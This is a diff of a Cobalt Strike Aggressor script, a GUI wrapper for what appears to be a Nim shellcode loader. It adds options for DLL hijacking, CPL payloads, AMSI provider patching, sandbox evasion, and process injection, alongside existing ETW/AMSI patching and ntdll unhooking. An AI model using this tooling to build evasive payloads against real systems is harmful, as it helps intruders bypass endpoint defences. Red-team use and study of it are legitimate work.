@@ -57,6 +57,18 @@ sub set_params {
                 push(@command, "--dllexportfunc", %options["dllexportfunc"])
         }
 
+        if (%options["dllhijack"] eq "true") {
+                push(@command, "--dllhijack")
+        }
+
+        if (%options["clone"] ne "") {
+                push(@command, "--clone", %options["clone"])
+        }
+
+        if (%options["cpl"] eq "true") {
+                push(@command, "--cpl")
+        }
+
         if (%options["noETW"] eq "true") {
                 push(@command, "--noETW")
         }
@@ -97,8 +109,17 @@ sub set_params {
                 push(@command, "--noDInvoke")
         }
 
-        if (%options["remoteinject"] eq "Newly spawned process (notepad)") {
+        if (%options["localCreateThread"] eq "true") {
+                push(@command, "--localCreateThread")
+        }
+
+        if (%options["remoteinject"] eq "Newly spawned process (default: notepad)") {
                 push(@command, "--remoteinject")
+
+                if (%options["customprocess"] ne "") {
+                push(@command, "--customprocess", %options["customprocess"])
+                }
+
                 if (%options["remotepatchAMSI"] eq "true"){
                     push(@command, "--remotepatchAMSI")
                 }
@@ -151,6 +172,10 @@ sub set_ev_params {
                 push(@command, "--sgn")
         }
 
+        if (%options["AMSIProviderPatch"] eq "true") {
+                push(@command, "--AMSIProviderPatch")
+        }
+
         if (%options["replace"] eq "true") {
                 push(@command, "--replace")
         }
@@ -169,6 +194,14 @@ sub set_ev_params {
 
         if (%options["sandbox"] eq "MemorySpace (more than 4GB RAM available)") {
                 push(@command, "--sandbox MemorySpace")
+        }
+
+        if (%options["sandbox"] eq "Emulated (VirtualAllocExNuma API call)") {
+                push(@command, "--sandbox Emulated")
+        }
+
+        if (%options["sandbox"] eq "WindowChanges (7 or more times)") {
+                push(@command, "--sandbox WindowChanges")
         }
 
         if (%options["pump"] eq "words") {
@@ -229,8 +262,9 @@ sub ev_menu {
         drow_checkbox($dialog_ev, "unhook", "Unhook: ", "Unhook ntdll.dll before doing anything else for the current process");
         drow_checkbox($dialog_ev, "obfuscate", "Obfuscate: ", "Compile via Denim to use LLVM obfuscation (not possible with --reflective)");
         drow_checkbox($dialog_ev, "sgn", "Shikata ga nai: ", "Encode shellcode via SGN before encrypting it");
+        drow_checkbox($dialog_ev, "AMSIProviderPatch", "AMSIProviderPatch: ", "Patch all AMSI Providers instead of 'amsi.dll'");
         drow_checkbox($dialog_ev, "replace", "Replace: ", "Replace common nim IoC's in the loader like the string 'nim'");
-        drow_combobox($dialog_ev, "sandbox", "Sandbox Evasion: ", @(" -", "Domain", "DomainJoined (any domain)", "DiskSpace >= 200GB", "MemorySpace (more than 4GB RAM available)"));
+        drow_combobox($dialog_ev, "sandbox", "Sandbox Evasion: ", @(" -", "Domain", "DomainJoined (any domain)", "DiskSpace >= 200GB", "MemorySpace (more than 4GB RAM available)", "Emulated (VirtualAllocExNuma API call)", "WindowChanges (7 or more times)"));
         drow_text($dialog_ev, "domain", "--- Sandbox Evasion Domain: ");
         drow_combobox($dialog_ev, "pump", "Pump the file with: ", @(" -", "words", "reputation"));
         drow_checkbox($dialog_ev, "self-delete", "Self-Delete: ", "Deletes own executable on runtime");
@@ -266,6 +300,9 @@ sub main_menu {
         drow_checkbox($dialog, "noRES", "noRES: ", "Don't set custom resource file information (cmd icon, CMD description by default)");
         drow_checkbox($dialog, "dll", "Generate a DLL: ", "Enabled");
         drow_text($dialog, "dllexportfunc", "--- DLL custom export functions: ", "Define custom export functions for the generated DLL");                
+        drow_checkbox($dialog, "dllhijack", "--- DLL Hijack:", "Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking");
+        drow_text($dialog, "clone", "--- DLL clone: ", "Specify a local DLL to clone the API-Exports from");                
+        drow_checkbox($dialog, "cpl", "--- CPL file:", "Generate a Control Panel Applet instead of an executable");
         drow_checkbox($dialog, "noETW", "No ETW: ", "Don't use ETW Patch");
         drow_checkbox($dialog, "noAMSI", "No AMSI: ", "Don't patch AMSI");
         drow_checkbox($dialog, "noArgs", "No Args: ", "Don't provide any arguments to the binary  (some can only run without args)");
@@ -276,7 +313,9 @@ sub main_menu {
         drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload");
         drow_checkbox($dialog, "large", "Large Files: ", "Enable for large payloads (>5MB) - Solves too many interactions error");
         drow_checkbox($dialog, "noDInvoke", "Don't use DInvoke: ", "Enable for older Windows OS Versions e.g. Windows Server 2012");
-        drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (notepad)", "Existing process"));
+        drow_checkbox($dialog, "localCreateThread", "Use NtCreateThreadEx: ", "For local injection instead of a direct pointer to the shellcode");
+        drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (default: notepad)", "Existing process"));
+        drow_text($dialog, "customprocess", "--- Custom new process: ", "Spawn a custom process (instead of notepad) for remote injection");
         drow_text($dialog, "remoteprocess", "--- Remote target process: ", "Injects into the specified remote process name");
         drow_checkbox($dialog, "remotepatchAMSI", "--- Remote AMSI: ", "Patch AMSI in the remote process before shellcode execution");
         drow_checkbox($dialog, "remotepatchETW", "--- Remote ETW: ", "Patch ETW in the remote process before shellcode execution");
